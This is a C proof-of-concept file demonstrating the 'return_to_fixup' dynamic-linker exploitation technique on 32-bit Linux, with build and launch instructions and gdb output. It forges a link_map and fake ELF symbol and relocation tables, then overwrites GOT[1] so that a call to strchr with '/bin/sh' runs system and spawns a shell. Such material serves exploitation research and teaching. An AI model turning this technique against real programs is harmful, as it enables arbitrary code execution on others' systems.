/* 
C POC for return_to_fixup technique (x32 version)
Copyright (C) 2016-2017 WindAvid
Join us now, share software,
You'll be a free hacker!

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

 * return_to_fixup POC example
 * for x32 arch
 *
 * building:
 *  $ gcc -m32 poc1_fixup.c -o poc1_fixup
 *  (LD_BIND_NOW must not be set in this POC!)
 *
 * launch from launch_poc1.py:
 *  $ python launch_poc1.py 
 *
 * launch from bash:
 *  before launch, find address
 *      _GLOBAL_OFFSET_TABLE_ :
 *         gdb-peda$ info variables _GLOBAL_OFFSET_TABLE_
 *         All variables matching regular expression "_GLOBAL_OFFSET_TABLE_":
 *         Non-debugging symbols:
 *         0x0804a000  _GLOBAL_OFFSET_TABLE_
 *
 *      reloc_arg of strchr@plt:
 *         gdb-peda$ disass 0x080483e0
 *         Dump of assembler code for function strchr@plt:
 *            0x080483e0 <+0>:     jmp    DWORD PTR ds:0x804a018
 *            0x080483e6 <+6>:     push   0x18
 *            0x080483eb <+11>:    jmp    0x80483a0
 *
 *  then launch and enter in hex format:
 *      _GOT_ reloc_arg 
 *
 *  for example:
 *      ./poc1_fixup
 *      0x0804a000 0x18
 */

// ============================================================================
// standard libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

// ============================================================================
// POC includes: define struct link_map and other stuff from libc
// for easy life
// 32 bit for now
#define __ELF_NATIVE_CLASS 32
#include "glib_link.h"

#define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#define ELFW(type)  _ElfW (ELF, __ELF_NATIVE_CLASS, type)

#define reloc_offset reloc_arg * sizeof (PLTREL)
#define reloc_index  reloc_arg

#define VERSYMIDX(sym)  (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))

// ============================================================================
// POC globals

// doesn't work, equals to _DYNAMIC after compilation
// TODO: hardcoded value now, make variable
ElfW(Word) _GOT_;
uint32_t reloc_arg;

// padding of link_map.l_scope_mem
#define OFF_L_SCOPE_MEM 0x1b8
struct link_map _lm;

// fake_link_map, stored in _lm global variable
struct link_map *fake_link_map = &_lm;
// original content of GOT[1], initialized in main
struct link_map *orig_link_map;
// helper typedef
typedef void **PArray;

// fake strtab, strindex for "system" will be 1
const char fake_strtab[] = "ssystem\0im\0fake\0strtab\0section";

// fake symbol table entry
ElfW(Sym) fake_syment;
// fake relocent table entry
ElfW(Rel) fake_relocent;

ElfW(Dyn) fdyn_symtab;
ElfW(Dyn) fdyn_strtab;
ElfW(Dyn) fdyn_jmprel;

// ============================================================================
// POC functions

// flag: 0 if GOT[1] contains original link_map, 1 if fake_link_map
int reloc_state = 0;
/*! helper function:
 * swaps orig_link_map and fake_link_map
 */
int swap_reloc_addr()
{
    if (!reloc_state){
        ((PArray)_GOT_)[1] = fake_link_map;
    } else {
        ((PArray)_GOT_)[1] = orig_link_map;
    }
    reloc_state = !reloc_state;
    return reloc_state;
}

/*! create own link_map structure, as it was an exploit,
 *  fill only required fields of fake_link_map
 *  use minimum information from original link_map: 
 *  address of oritinal link_map is all we need to know
 *
 *  dst is fake_link_map
 *  src is original link_map
 */
void fill_link_map_fake(struct link_map *dst, struct link_map *src, uint32_t reloc_arg)
{
    // demonstration, that most link_map fields are not important for dl_fixup:
    // set all bytes of fake_link_map with 'A'
    memset(dst, 0x41, sizeof(struct link_map));
    // OWN PARAMETERS
    dst->l_addr = 0; // src->l_addr is NULL all the time
    // disable version search in dl_fixup
    dst->l_info[VERSYMIDX (DT_VERSYM)] = NULL; 
    // l->l_scope always points to l->l_scope_mem
    // l_scope_mem address is relative to host structure
    dst->l_scope = (void *)src + OFF_L_SCOPE_MEM;

    // build reference system: REFERENCES
    // reltab[reloc_index] -> symtab[symindex] -> strtab[strindex]
    // we can choose symindex and strindex
    int symindex = 0;
    int strindex = 1;

    // STRING TABLE
	// fill dynamic pointer to string table
    fdyn_strtab.d_tag = DT_STRTAB; 
    fdyn_strtab.d_un.d_ptr = (int)&fake_strtab;
	// pointer to dynamic pointer
    dst->l_info[DT_STRTAB] = &fdyn_strtab;

    // SYMBOL TABLE
	// fill fake symtab entry: only one field is required, rest may be 0's
    fake_syment.st_name = strindex;    // index in string table
	// fill dynamic pointer to string table
    fdyn_symtab.d_tag = DT_SYMTAB;
    fdyn_symtab.d_un.d_ptr = (ElfW(Addr))&fake_syment - symindex * sizeof(ElfW(Sym));
	// pointer to dynamic pointer
    dst->l_info[DT_SYMTAB] = &fdyn_symtab; 

    // RELOC TABLE
	// fake reltab entry
	uint64_t r_index = symindex; // index in symtab
	uint64_t r_type = 7;  // for X86_64
	// TODO: make with macros
    fake_relocent.r_info = (r_index << 8) | r_type;
    fake_relocent.r_offset = _GOT_ + 4 * sizeof(void *);
	// dynamic pointer to relocation table
    fdyn_jmprel.d_tag = DT_JMPREL;
	// TODO: calc index with macros
    fdyn_jmprel.d_un.d_ptr = (ElfW(Addr))&fake_relocent - dst->l_addr - reloc_arg;
	// pointer to dynamic pointer
    dst->l_info[DT_JMPREL] = &fdyn_jmprel; //src->l_info[DT_JMPREL];
}

int main(void)
{
    printf("%d: enter address of GOT and puts's reloc_arg in hex\n", 0);
    scanf("%x %x", &_GOT_, &reloc_arg);
    printf("addr of _GOT_ = 0x%x, reloc_arg = 0x%x\n", _GOT_, reloc_arg);

    // initialize orig_link_map
	orig_link_map = ((PArray)_GOT_)[1];	

    fill_link_map_fake(fake_link_map, orig_link_map, reloc_arg);

    // replace GOT[1]: from orig_link_map to fake_link_map
    swap_reloc_addr();
    // now call strchr but actually execute system!
    char binsh[] = "/bin/sh";
    // WARNING: in this POC strchr must be called first time here,
    // cause we want a relatively simple demo programm
    // if puts was called earlie, POC won't work (cuz dl_dixup won't be called)
	// also, LD_BIND_NOW must not be set, cuz dl_fixup won't be called either
    char *pos = strchr(binsh, 's');
    printf("s is on %d place\n", pos - binsh);
    return 0;
}
